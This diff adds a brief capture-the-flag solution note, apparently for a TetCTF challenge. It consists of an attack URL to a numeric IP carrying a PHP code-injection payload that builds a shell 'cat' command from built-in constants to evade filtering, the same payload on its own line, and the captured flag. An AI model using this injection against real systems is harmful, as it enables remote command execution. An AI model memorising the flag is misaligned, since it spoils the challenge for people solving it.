@@ -1,0 +1,5 @@
+http://192.46.227.32/?roll=shell_exec(cat.chr(DNS_SOA).chr(SOCKET_ENOMSG)).pi
+
+Payload: shell_exec(cat.chr(DNS_SOA).chr(SOCKET_ENOMSG)).pi
+
+$flagsssssssss = "TetCTF{lixi_50k_<3_vina_*100*25926415724382#}";
